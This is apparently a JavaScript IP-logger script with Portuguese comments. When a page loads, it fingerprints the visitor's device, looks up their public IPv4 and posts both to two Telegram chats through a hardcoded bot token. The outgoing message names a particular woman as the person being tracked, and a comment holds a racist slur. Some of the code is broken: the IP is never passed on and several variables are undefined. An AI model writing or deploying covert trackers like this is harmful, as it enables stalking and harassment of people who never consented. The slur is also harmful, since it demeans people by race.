// ================================================
// script.js - Forçando IPv4 e enviando via teleporra
// ================================================

const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";

const CHAT_IDS = [
    "8448614204",   // Mr. Lonely (Sou eu porra)
    "8219025301",   // Luiz (Mono macaco queimado preto escravo)
];


// função desgraçada pra mandar msg alternativa
async function SendCoisa(text) {
    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            });
        } catch (err) {}
    }
}


function detectDeviceType() {
    const ua = navigator.userAgent.toLowerCase();
    if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
    if (/playstation|xbox|nintendo|switch/i.test(ua)) return "Console de videogame";
    if (/ipad|tablet|playbook|silk/i.test(ua)) return "Tablet";
    if (/android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua)) return "Celular";
    return "Computador";
}

function getDeviceInfo() {
    const deviceType = detectDeviceType();
    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unkown";
    const others = {
        "navigator app_name: " : navigator.appName,
        "navigator app_version: " : navigator.appVersion,
        "user gpu: " : navigator.gpu,
        "user gamepads: " : navigator.getGamepads,
        "storage: " : navigator.storage,
        "java enable?: " : navigator.javaEnabled(),
        "permissons of site: " : navigator.permissions,
        "You want a cookie?: " : navigator.cookieEnabled,
        "credentials: " : navigator.credentials,
        "plugins: " : navigator.plugins,
        "product: ": navigator.product,
        "type of connection wifi: " :  navigator.connection,
        "connection state: " : navigator.onLine,
    }
    return {
        deviceType,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || navigator.userLanguage,
        screen: `${window.screen.width} x ${window.screen.height}`,
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: ram,
        outros: others
    };
}

// ==================== PEGAR IPv4 FORÇADO ====================

async function getIPv4({ timeoutMs = 3000 } = {}) {
    const isIPv4 = ip => /^(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)$/.test(ip);

    const fetchWithTimeout = (url, opts = {}) => {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), timeoutMs);
        return fetch(url, { ...opts, signal: controller.signal })
            .finally(() => clearTimeout(id));
    };

    const endpoints = [
        'https://api.ipify.org?format=json',           // retorna {ip: "..."}
        'https://api4.my-ip.io/ip.json',               // retorna {ip: "..."}
        'https://ipv4.icanhazip.com',                  // retorna texto puro
        'https://api4.ipify.org?format=json',          // força ipv4 no domínio
        'https://ipapi.co/json/'                       // ipapi.co retorna {ip: "..."} + geo
    ];

    for (const url of endpoints) {
        try {
            const res = await fetchWithTimeout(url);
            if (!res.ok) continue;

            const text = await res.text();
            let ip;

            try {
                ip = JSON.parse(text).ip; // tenta parse JSON
            } catch {
                ip = text.trim(); // se não for JSON, pega texto puro
            }

            if (isIPv4(ip)) return ip;
        } catch (e) {
            // ignora e tenta próximo fallback
            SendCoisa(`Falha no endpoint ${url}:`, e.message);
        }
    }

    SendCoisa("Todos os fallbacks de IPv4 falharam");
    return "Não capturado";
}

// ==================== MENSAGEM QUANDO ENTRAR ====================
async function sendMessage(ip) {
    if (ip) processedIPs.set(ip, now);

    const device = getDeviceInfo();

    const message = `a 𝐵𝓇𝓊𝓃𝒶 entrou no site ;---; (agora, eu realmente enviei pra ela kaakaka)\n\n` +
                    `sim, pegamos o ip da Bruna e outros dados do dispositivo, são esses ai\n\n` +
                    `• Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `• IP (IPv4): ${ip} <<< Pode ser o bot do insta, observe o IP\n` +
                    `• Tipo: ${device.deviceType}\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Tela: ${device.screen}\n` +
                    `• RAM: ${device.deviceMemory}\n` +
                    `• Outros: ${device.others}\n\n` +
                    `Bah guri, kakaakak, tmnc to quase morrendo pra fazer esse script`;

    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
        } catch (err) {}
    }
}

// ==================== CAPTURA AO ENTRAR ====================
async function captureIPOnLoad() {
    const ip = await getIPv4();
    await sendMessage();
}

// ==================== INICIALIZAÇÃO ====================
async function init() {
    await captureIPOnLoad();   // Pega IPv4 + envia a mensagem no teleporra
}

init();
